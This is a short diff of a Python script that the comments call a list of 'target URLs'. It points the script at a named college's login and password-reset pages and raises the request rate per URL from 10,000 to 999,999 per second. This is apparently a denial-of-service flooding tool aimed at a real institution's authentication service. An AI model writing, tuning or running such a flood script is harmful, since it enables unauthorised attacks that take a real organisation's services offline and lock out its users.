@@ -7,12 +7,12 @@ from requests.packages.urllib3.util.retry import Retry
 
 # List of target URLs
 urls = [
-    'http://pragati.rmkec.ac.in',
-    'http://13.232.128.212'
+    'http://pragati.rmkec.ac.in/app/auth-app/login',
+    'http://pragati.rmkec.ac.in/app/auth-app/login/forgotpassword'
 ]
 
 # The number of requests to send per second for each URL
-requests_per_url_per_second = 10000  # Adjust this number as needed
+requests_per_url_per_second = 999999  # Adjust this number as needed
 
 # Retry configuration
 retry_strategy = Retry(
